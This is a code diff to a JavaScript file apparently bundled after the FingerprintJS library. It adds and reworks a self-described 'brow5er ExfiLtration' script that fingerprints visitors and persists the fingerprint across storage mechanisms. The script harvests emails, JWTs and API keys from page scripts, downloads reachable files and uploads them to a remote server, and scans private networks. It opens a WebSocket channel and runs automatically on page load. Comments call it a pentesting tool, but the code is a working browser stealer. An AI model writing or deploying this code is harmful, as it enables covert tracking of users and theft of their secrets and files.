@@ -10049,17 +10049,25 @@
 })));
 
 /*
-* 5ELG - BROWSER FINGERPRINTING 
-* Version: 1.0
-* Author: 5ELG
-* Description: This script is used to fingerprint the user's browser and store the fingerprint in multiple storage locations.
-*             The fingerprint is generated using the FingerprintJS library and extended with additional data.
-*             The fingerprint is then stored in LocalStorage, SessionStorage, Cookies, Cache API, and IndexedDB.
+============================================================
+ 5ELG - brow5er ExfiLtration and finGerprinting 
+============================================================
+Version: 1.0
+Author: 5ELG
+
+- Fingerprinting avanzado: Genera una huella única del navegador y dispositivo del usuario combinando datos de hardware, software, red, permisos, plugins, WebGL, WebRTC, APIs experimentales, etc. La huella se almacena en múltiples mecanismos de almacenamiento (LocalStorage, SessionStorage, Cookies, Cache API, IndexedDB) para persistencia y evasión.
+- Captura de pantalla y HTML: Realiza una captura visual de la página y extrae el HTML completo, codificándolo y enviándolo al backend para análisis forense o reconstrucción offline.
+- Extracción de rutas y recursos: Analiza el DOM para identificar todos los enlaces, scripts, endpoints, imágenes y recursos referenciados, clasificándolos por tipo (JS, endpoints, otros).
+- Análisis de scripts: Descarga y analiza los archivos JavaScript y scripts inline en busca de emails, tokens JWT, claves API y otros patrones sensibles.
+- Exfiltración de archivos: Permite descargar y exfiltrar archivos accesibles desde el navegador (PDF, imágenes, JS, etc.) codificándolos en base64 y enviándolos al servidor.
+- Escaneo de red: Intenta detectar servicios web accesibles en la red local o remota mediante técnicas de escaneo de puertos HTTP/HTTPS desde el navegador.
+- Comunicación WebSocket: Establece un canal persistente con el servidor para enviar información en tiempo real y recibir instrucciones.
+
 
 
 */
-    let velghost = "10.13.37.40";
-    let dealerUri = "/dealer";
+    let velghost = "";
+    let dealerUri = "/dealer/1.png";
 
     let socket;
     let encodedPageHTML;
@@ -10266,112 +10274,23 @@
         // If nothing is found in any storage mechanism, return null
         return null;
     }
-       
-    async function uploadFile(id, filename, filecontent) {
-        const formData = new FormData();
-        formData.append("file", new Blob([filecontent], { type: "application/octet-stream" }), filename);
-        formData.append("ID", id);
-
-        fetch("http://"+velghost+"/upload", {
-            method: "POST",
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Success:', data);
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-    }
-       
-    function findEmailAddresses(bodyText) {
-        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;            
-        const emails = bodyText.match(emailRegex) || [];
-        return Array.from(new Set(emails)); // Remove duplicates
-    }
-    function findJwtTokens(content) {
-        // Regular expression to match JWT tokens
-        const jwtRegex = /\b[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b/g;
-        const tokens = content.match(jwtRegex) || [];
-        return Array.from(new Set(tokens)); // Remove duplicates
-    }
-    function findApiKeys(content) {
-        const apiKeyPatterns = {
-            googleApiKey: /AIza[0-9A-Za-z-_]{35}/g,
-            amazonAccessKeyId: /AKIA[0-9A-Z]{16}/g,
-            amazonSecretAccessKey: /[0-9a-zA-Z/+]{40}/g,
-            firebaseApiKey: /AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}/g,
-            githubToken: /ghp_[0-9a-zA-Z]{36}/g,
-            slackToken: /xox[baprs]-[0-9a-zA-Z]{10,48}/g,
-            stripeSecretKey: /sk_live_[0-9a-zA-Z]{24}/g,
-            stripePublishableKey: /pk_live_[0-9a-zA-Z]{24}/g,
-            twilioApiKey: /SK[0-9a-fA-F]{32}/g,
-            sendgridApiKey: /SG\.[0-9A-Za-z-_]{22}\.[0-9A-Za-z-_]{43}/g,
-            mailgunApiKey: /key-[0-9a-zA-Z]{32}/g,
-            herokuApiKey: /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/g
-        };
-
-        const foundKeys = {};
-
-        for (const [keyName, regex] of Object.entries(apiKeyPatterns)) {
-            const matches = content.match(regex) || [];
-            if (matches.length > 0) {
-                foundKeys[keyName] = Array.from(new Set(matches)); // Remove duplicates
-            }
-        }
-
-        return foundKeys;
-    }
     
+    
+// Scanning functions
     /**
-     * WEBSOCKET AND STEALER
-     * 
-     * This section of the code focuses on WebSocket communication and various "stealing" techniques
-     * that are used for analyzing, extracting, and sending useful information from the client to the server.
-     * It collects data such as private network details, email addresses, API keys, JavaScript files,
-     * and other endpoint-related information.
-     * 
-     * The primary goal of this section is to:
-     * - Establish a WebSocket connection with a server.
-     * - Extract information from the client's environment.
-     * - Analyze JavaScript files and endpoints for sensitive data (e.g., emails, JWTs, API keys).
-     * - Send extracted data securely via WebSocket.
-     * 
+     * Escáner de red en JavaScript para detectar servicios web accesibles desde el navegador.
+     * Intenta conectar a los puertos indicados usando fetch (modo no-cors), lo que permite saber si el puerto responde o está cerrado.
+     * IMPORTANTE: Este método solo funciona para servicios HTTP/HTTPS y similares accesibles desde el navegador.
+     * Tiene muchos márgenes de error para servicios que no sean web (por ejemplo, SMTP, FTP, SSH, etc.), ya que el navegador no puede abrir conexiones directas a esos protocolos.
+     * Además, algunos navegadores o configuraciones de red pueden bloquear o falsear las respuestas, por lo que los resultados no son 100% fiables.
+     * Sin embargo, para detectar servicios web abiertos en la red local o remota, es una técnica funcional y sencilla de implementar en JS puro.
+     * @param {*} ip Dirección IP a escanear
+     * @param {*} port Puerto a escanear
+     * @returns {Promise<{status: string, response: string}>} Resultado del escaneo
      */
-    
-    function connectWebSocket() {
-        try {
-            const wsUrl = `ws://${velghost}/?u=${encodeURIComponent(userFingerprint)}&b=${encodeURIComponent(fingerprintData)}`;
-            socket = new WebSocket(wsUrl);
-        
-            socket.onopen = () => {
-                console.log("[5ELG-WS] WebSocket connection established.");
-                sendLinksAndScriptsToWebSocket(socket, userFingerprint)
-                sendNetworkDataToWebSocket(socket, userFingerprint);
-
-            };
-
-            socket.onmessage = (event) => {
-                console.log("[5ELG-WS] Message received:", event.data);
-            };
-
-            socket.onclose = (event) => {
-                console.warn("[5ELG-WS] WebSocket connection closed:", event.reason);
-            };
-
-            socket.onerror = (error) => {
-                console.error("[5ELG-WS] WebSocket error:", error);
-            };
-
-        } catch (err) {
-            console.error("[5ELG-WS] Failed to connect WebSocket:", err);
-        }
-    }
-
-    // Scanning functions
     async function scanPort(ip, port) {
-            const url = `http://${ip}:${port}`;
+            //const url = `http://${ip}:${port}`;
+            const url = `${ip}:${port}`;
             try {
                 const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
                     
@@ -10415,80 +10334,101 @@
         return results;
     }
 
-    function extractRoutes() {
-        const routes = {
-            javascriptFiles: [],
-            endpoints: [],
-            others: []
-        };
+    
+    function sendNetworkDataToWebSocket(socket, id) {
+        try {
+            var networkResults;
+            console.log("[5ELG-DEALER] SLOW FEWTCH - Network scanning running:", networkResults);
+            // Escanear redes privadas
+            scanPrivateNetworks(socket, id).then(networkResults => {
+                if (socket && socket.readyState === WebSocket.OPEN) {
+                    console.log("[5ELG-WS] Network data sent to WebSocket:", networkResults);
+                } else {
+                    console.warn("[5ELG-WS] WebSocket is not open. Could not send network data.");
+                }
+            }).catch(error => {
+                console.error("[5ELG] Error scanning private networks:", error);
+            });
+        } catch (error) {
+            console.error("[5ELG] Failed to send network data:", error);
+        }
+    }
 
-        // Helper function to add routes to the appropriate category
-        function addRoute(url) {
-            if (url.endsWith('.js')) {
-                routes.javascriptFiles.push(url);
-            } else if (url.startsWith('http') || url.startsWith('/')) {
-                routes.endpoints.push(url);
-            } else {
-                routes.others.push(url);
+
+/*
+============================================================
+ SECCIÓN: Extracción y análisis de información sensible en JavaScript
+============================================================
+
+Funciones incluidas:
+- findEmailAddresses(bodyText):
+    Busca y extrae todas las direcciones de correo electrónico presentes en un texto usando una expresión regular. Elimina duplicados.
+
+- findJwtTokens(content):
+    Busca posibles tokens JWT en un texto mediante una expresión regular. Valida que tengan tres partes y que el header contenga campos típicos de JWT. Elimina duplicados.
+
+- findApiKeys(content):
+    Busca patrones comunes de claves API (Google, Amazon, Firebase, GitHub, Slack, etc.) en un texto. Devuelve un objeto con los tipos de clave encontrados y sus valores únicos.
+
+- analyzeJavaScriptFiles(jsFiles):
+    Descarga y analiza el contenido de una lista de archivos JavaScript remotos, buscando emails, JWTs y claves API en cada uno. También analiza los <script> inline de la página. Devuelve un array con los resultados por archivo.
+
+Estas funciones son útiles para automatizar la búsqueda de información sensible en el código fuente y scripts de una web, facilitando tareas de pentesting, OSINT o auditoría de seguridad.
+*/
+
+    function findEmailAddresses(bodyText) {
+        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;            
+        const emails = bodyText.match(emailRegex) || [];
+        return Array.from(new Set(emails)); // Remove duplicates
+    }
+    function findJwtTokens(content) {
+        // Regular expression to match JWT tokens with common headers
+        const jwtRegex = /\beyJ(?:[a-zA-Z0-9-_]+)\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b/g;
+        const tokens = content.match(jwtRegex) || [];
+    
+        // Validate that the token has three parts and the header contains common JWT fields
+        const validTokens = tokens.filter(token => {
+            const parts = token.split('.');
+            if (parts.length !== 3) return false;
+    
+            try {
+                const header = JSON.parse(atob(parts[0]));
+                const validHeaders = ['alg', 'typ', 'cty', 'kid', 'jku', 'x5u', 'x5t', 'x5c', 'crit'];
+                return validHeaders.some(headerField => header.hasOwnProperty(headerField));
+            } catch (e) {
+                return false;
+            }
+        });
+    
+        return Array.from(new Set(validTokens)); // Remove duplicates
+    }
+    function findApiKeys(content) {
+        const apiKeyPatterns = {
+            googleApiKey: /AIza[0-9A-Za-z-_]{35}/g,
+            amazonAccessKeyId: /AKIA[0-9A-Z]{16}/g,
+            firebaseApiKey: /AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}/g,
+            githubToken: /ghp_[0-9a-zA-Z]{36}/g,
+            slackToken: /xox[baprs]-[0-9a-zA-Z]{10,48}/g
+        };
+    
+        const foundKeys = {};
+    
+        for (const [keyName, regex] of Object.entries(apiKeyPatterns)) {
+            const matches = content.match(regex) || [];
+            if (matches.length > 0) {
+                // Validate that the matches are unique and not substrings of each other
+                const validMatches = matches.filter((match, index, self) => {
+                    return self.indexOf(match) === index && !self.some(other => other !== match && other.includes(match));
+                });
+                if (validMatches.length > 0) {
+                    foundKeys[keyName] = validMatches;
+                }
             }
         }
-
-        // Extract routes from <a> tags
-        document.querySelectorAll('a[href]').forEach(anchor => {
-            addRoute(anchor.getAttribute('href'));
-        });
-
-        // Extract routes from <form> tags
-        document.querySelectorAll('form[action]').forEach(form => {
-            addRoute(form.getAttribute('action'));
-        });
-
-        // Extract routes from <script> tags
-        document.querySelectorAll('script[src]').forEach(script => {
-            addRoute(script.getAttribute('src'));
-        });
-
-        // Extract routes from <link> tags
-        document.querySelectorAll('link[href]').forEach(link => {
-            addRoute(link.getAttribute('href'));
-        });
-
-        // Extract routes from <img> tags
-        document.querySelectorAll('img[src]').forEach(img => {
-            addRoute(img.getAttribute('src'));
-        });
-
-        // Extract routes from <iframe> tags
-        document.querySelectorAll('iframe[src]').forEach(iframe => {
-            addRoute(iframe.getAttribute('src'));
-        });
-
-        // Extract routes from inline styles
-        document.querySelectorAll('[style]').forEach(element => {
-            const style = element.getAttribute('style');
-            const urlMatches = style.match(/url\(['"]?([^'"]+)['"]?\)/g);
-            if (urlMatches) {
-                urlMatches.forEach(match => {
-                    const url = match.match(/url\(['"]?([^'"]+)['"]?\)/)[1];
-                    addRoute(url);
-                });
-            }
-        });
-
-        // Extract routes from the DOM text content
-        const bodyText = document.body.innerText;
-        const urlRegex = /https?:\/\/[^\s]+/g;
-        const urls = bodyText.match(urlRegex) || [];
-        urls.forEach(url => addRoute(url));
-
-        // Remove duplicates
-        routes.javascriptFiles = Array.from(new Set(routes.javascriptFiles));
-        routes.endpoints = Array.from(new Set(routes.endpoints));
-        routes.others = Array.from(new Set(routes.others));
-
-        return routes;
+    
+        return foundKeys;
     }
-        
+
     async function analyzeJavaScriptFiles(jsFiles) {
         const results = [];
 
@@ -10503,7 +10443,6 @@
 
                 results.push({
                     file,
-                    content,
                     emails,
                     apiKs,
                     jwtTokens
@@ -10513,63 +10452,303 @@
             }
         }
 
+        
+        // Analizar el contenido de los <script> tags en la página cargada
+        const scriptTags = document.querySelectorAll('script');
+        for (const scriptTag of scriptTags) {
+            if (scriptTag.src) {
+                // Si el <script> tag tiene un src, ya se ha analizado en jsFiles
+                continue;
+            }
+
+            const content = scriptTag.textContent || '';
+            const emails = findEmailAddresses(content);
+            const jwtTokens = findJwtTokens(content);
+            const apiKs = findApiKeys(content);
+
+            results.push({
+                file: 'inline-script',
+                emails,
+                apiKs,
+                jwtTokens
+            });
+        }
+
         return results;
     }
-    async function extractAndAnalyzeRoutes() {
+    async function runExtractRoutes() {
         const routes = extractRoutes();
-        const jsAnalysis = await analyzeJavaScriptFiles(routes.javascriptFiles);
+        return routes;
+    }
 
-        const result = {
-            routes,
-            jsAnalysis
+
+/*
+============================================================
+ SECCIÓN: Descarga y exfiltración de archivos vía navegador
+============================================================
+
+Funciones:
+- makeFileRequest(url, callback):
+    Realiza una petición GET a la URL indicada y descarga el archivo como arraybuffer.
+    Convierte el contenido binario a base64 (en bloques pequeños para evitar problemas de memoria).
+    Llama al callback con el resultado en base64 o null si falla.
+    Útil para obtener archivos estáticos accesibles desde el navegador (PDF, imágenes, JS, etc).
+
+- stealFile(userFingerprint, uri):
+    Usa makeFileRequest para descargar el archivo de la URI indicada.
+    Si lo consigue, lo sube al backend usando uploadFile (junto al fingerprint y la URI).
+    Si falla la descarga o la subida, simplemente resuelve la promesa para poder continuar con otros archivos.
+    Permite automatizar la exfiltración de archivos desde el navegador a tu servidor.
+
+Estas funciones son útiles para pentesting, OSINT o pruebas de seguridad, pero dependen de que los archivos sean accesibles desde el navegador y pueden estar limitadas por CORS o políticas de seguridad del sitio.
+*/
+
+
+    async function uploadFile(id, filename, filecontent) {
+        const formData = new FormData();
+        formData.append("file", new Blob([Uint8Array.from(atob(filecontent), c => c.charCodeAt(0))], { type: "application/octet-stream" }), filename);
+        
+        fetch("//" + velghost + "/upload/file?ID="+id, {
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+       
+    async function makeFileRequest(url, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.responseType = "arraybuffer";
+    
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var response = xhr.response;
+                var contentType = xhr.getResponseHeader("Content-Type");
+    
+                // Convertir el array buffer a base64 en partes más pequeñas
+                var binary = '';
+                var bytes = new Uint8Array(response);
+                var len = bytes.byteLength;
+                for (var i = 0; i < len; i += 1024) {
+                    binary += String.fromCharCode.apply(null, bytes.subarray(i, i + 1024));
+                }
+                var result = btoa(binary);
+                console.log("Response (Base64):", result);
+                callback(result);
+            } else {
+                console.error("Request failed with status:", xhr.status);
+                callback(null);
+            }
+        };
+    
+        xhr.onerror = function() {
+            console.error("Request failed due to a network error.");
+            callback(null);
+        };
+    
+        xhr.send();
+    }
+    
+
+    async function stealFile(userFingerprint, uri) {
+        return new Promise((resolve, reject) => {
+            makeFileRequest(uri, function(result) {
+                if (result) {
+                    uploadFile(userFingerprint, uri, result)
+                        .then(() => resolve())
+                        .catch((error) => {
+                            console.error("Failed to upload file:", uri, error);
+                            resolve(); // Resolve to continue with the next file
+                        });
+                } else {
+                    console.error("Failed to retrieve file:", uri);
+                    resolve(); // Resolve to continue with the next file
+                }
+            });
+        });
+    }
+         
+    
+    /**
+     * WEBSOCKET AND STEALER
+     * 
+     * This section of the code focuses on WebSocket communication and various "stealing" techniques
+     * that are used for analyzing, extracting, and sending useful information from the client to the server.
+     * It collects data such as private network details, email addresses, API keys, JavaScript files,
+     * and other endpoint-related information.
+     * 
+     * The primary goal of this section is to:
+     * - Establish a WebSocket connection with a server.
+     * - Extract information from the client's environment.
+     * - Analyze JavaScript files and endpoints for sensitive data (e.g., emails, JWTs, API keys).
+     * - Send extracted data securely via WebSocket.
+     * 
+     */
+    
+    function connectWebSocket() {
+        try {
+            let wsHost = velghost;
+            if (!wsHost || wsHost.trim() === "") {
+                // Use the current domain and port if velghost is empty
+                wsHost = window.location.host;
+            }
+            const wsUrl = `wss://${wsHost}/?u=${encodeURIComponent(userFingerprint)}&b=${encodeURIComponent(fingerprintData)}`;
+            socket = new WebSocket(wsUrl);
+
+            socket.onopen = () => {
+                console.log("[5ELG-WS] WebSocket connection established.");
+                //links and files
+                sendLinksAndScriptsToWebSocket(socket, userFingerprint)
+                //semdFilesToWebSocket(socket, userFingerprint);
+                //network
+                //sendNetworkDataToWebSocket(socket, userFingerprint);
+
+            };
+
+            socket.onmessage = (event) => {
+                console.log("[5ELG-WS] Message received:", event.data);
+            };
+
+            socket.onclose = (event) => {
+                console.warn("[5ELG-WS] WebSocket connection closed:", event.reason);
+            };
+
+            socket.onerror = (error) => {
+                console.error("[5ELG-WS] WebSocket error:", error);
+            };
+
+        } catch (err) {
+            console.error("[5ELG-WS] Failed to connect WebSocket:", err);
+        }
+    }
+
+    
+    function extractRoutesFromDom(domRoot) {
+        const routes = {
+            javascriptFiles: [],
+            endpoints: [],
+            others: []
         };
 
-        console.log(JSON.stringify(result, null, 2));
-        return result;
+        const baseUrl = window.location.origin;
+
+        function normalizeUrl(url) {
+            if (!url) return '';
+            if (url.startsWith('http://') || url.startsWith('https://')) {
+                return url;
+            }
+            if (url.startsWith('/')) {
+                return `${baseUrl}${url}`;
+            }
+            return url;
+        }
+
+        function addRoute(url) {
+            const fullUrl = normalizeUrl(url);
+            if (!fullUrl) return;
+            if (fullUrl.endsWith('.js')) {
+                routes.javascriptFiles.push(fullUrl);
+            } else if (
+                fullUrl.startsWith('http') &&
+                !/\.[a-zA-Z0-9]{1,6}(\?.*)?(#.*)?$/.test(fullUrl.split('?')[0].split('#')[0]) // No tiene extensión
+            ) {
+                routes.endpoints.push(fullUrl);
+            } else {
+                if (url.startsWith('http://') || url.startsWith('https://') || url.startsWith('ftp://') || url.startsWith('file://')) {
+                    routes.others.push(fullUrl);
+                } else {
+                    routes.others.push(`${baseUrl}/${fullUrl}`);
+                }
+            }
+        }
+
+        domRoot.querySelectorAll('a[href]').forEach(anchor => addRoute(anchor.getAttribute('href')));
+        domRoot.querySelectorAll('form[action]').forEach(form => addRoute(form.getAttribute('action')));
+        domRoot.querySelectorAll('script[src]').forEach(script => addRoute(script.getAttribute('src')));
+        domRoot.querySelectorAll('link[href]').forEach(link => addRoute(link.getAttribute('href')));
+        domRoot.querySelectorAll('img[src]').forEach(img => addRoute(img.getAttribute('src')));
+        domRoot.querySelectorAll('iframe[src]').forEach(iframe => addRoute(iframe.getAttribute('src')));
+
+        domRoot.querySelectorAll('[style]').forEach(element => {
+            const style = element.getAttribute('style');
+            if (!style) return;
+            const urlMatches = style.match(/url\(['"]?([^'"]+)['"]?\)/g);
+            if (urlMatches) {
+                urlMatches.forEach(match => {
+                    const url = match.match(/url\(['"]?([^'"]+)['"]?\)/)[1];
+                    addRoute(url);
+                });
+            }
+        });
+
+        const bodyText = domRoot.body ? domRoot.body.innerText : '';
+        const urlRegex = /https?:\/\/[^\s]+/g;
+        (bodyText.match(urlRegex) || []).forEach(url => addRoute(url));
+
+        routes.javascriptFiles = Array.from(new Set(routes.javascriptFiles));
+        routes.endpoints = Array.from(new Set(routes.endpoints));
+        routes.others = Array.from(new Set(routes.others));
+
+        return routes;
+    }
+
+    // Mantener compatibilidad con el resto del código
+    function extractRoutes() {
+        return extractRoutesFromDom(document);
     }
 
     function sendLinksAndScriptsToWebSocket(socket, id) {
         try {
             // Extraer rutas y analizar JavaScript
-            extractAndAnalyzeRoutes().then(result => {
+            runExtractRoutes().then(async result => {
                 const dataToSend = {
-                    links: result.routes.endpoints, // Enlaces de la página
-                    jsFiles: result.routes.javascriptFiles, // Archivos JavaScript
-                    analysis: result.jsAnalysis // Análisis de los archivos JavaScript
+                    links: result.endpoints, // Enlaces de la página
+                    jsFiles: result.javascriptFiles, // Archivos JavaScript
+                    other: result.others // Otros enlaces
                 };
-
+    
                 content = { route:"pwdata", data: {Fu: id, c:dataToSend} }
-
+    
                 if (socket && socket.readyState === WebSocket.OPEN) {
                     socket.send(JSON.stringify(content));
-                    console.log("[5ELG-WS] Links and JavaScript data sent to WebSocket:", dataToSend);
+                    
                 } else {
                     console.warn("[5ELG-WS] WebSocket is not open. Could not send data.");
                 }
+    
+                // Procesar los archivos en dataToSend.other
+                for (const fileURI of Object.values(dataToSend.other)) {
+                    console.log(fileURI);
+                    await stealFile(id, fileURI);
+                }
+
+                analyzeJavaScriptFiles(dataToSend.jsFiles).then(jsResults => { 
+                
+                    intelcontent = { route:"inteldata", data: {Fu: id, c:jsResults} }
+                    console.log(intelcontent);
+                    
+                    if (socket && socket.readyState === WebSocket.OPEN) {
+                        socket.send(JSON.stringify(intelcontent));        
+                        console.log("[5ELG-WS] INTEL CONTENT SENT");
+
+                    } else {
+                        console.warn("[5ELG-WS] WebSocket is not open. Could not send data.");
+                    }
+                
+                });
+                console.log("[5ELG-WS] Links and JavaScript data sent to WebSocket");
+    
             }).catch(error => {
                 console.error("[5ELG] Error analyzing links and JavaScript files:", error);
             });
         } catch (error) {
             console.error("[5ELG] Failed to send links and scripts:", error);
-        }
-    }
-
-    function sendNetworkDataToWebSocket(socket, id) {
-        try {
-            var networkResults;
-            console.log("[5ELG-DEALER] Network scanning running:", networkResults);
-            // Escanear redes privadas
-            scanPrivateNetworks(socket, id).then(networkResults => {
-                if (socket && socket.readyState === WebSocket.OPEN) {
-                    console.log("[5ELG-WS] Network data sent to WebSocket:", networkResults);
-                } else {
-                    console.warn("[5ELG-WS] WebSocket is not open. Could not send network data.");
-                }
-            }).catch(error => {
-                console.error("[5ELG] Error scanning private networks:", error);
-            });
-        } catch (error) {
-            console.error("[5ELG] Failed to send network data:", error);
         }
     }
 
@@ -10894,18 +11073,26 @@
         });
     }
 
-    /*
-    ** Initialize
-    */
-    window.onload = async function () {
-        try {
-            
-            await initializeFingerprints(); // Wait for fingerprint initialization to complete
-            captureAndSendData(); // Capture and send data via HTTP
-            connectWebSocket(); // Connect WebSocket
 
-        } catch (error) {
-            console.error("[5ELG] Initialization error:", error);
-        }
-    };
+/*
+=======
+ INIT
+=======
+*/
+
+async function fiveelgInit() {
+    try {
+        await initializeFingerprints(); // Espera a la inicialización de huellas
+        captureAndSendData(); // Captura y envía datos vía HTTP
+        connectWebSocket(); // Conecta WebSocket
+    } catch (error) {
+        console.error("[5ELG] Initialization error:", error);
+    }
+}
+
+if (document.readyState === "complete" || document.readyState === "interactive") {    
+    fiveelgInit();
+} else {
+    window.onload = fiveelgInit;
+}
 
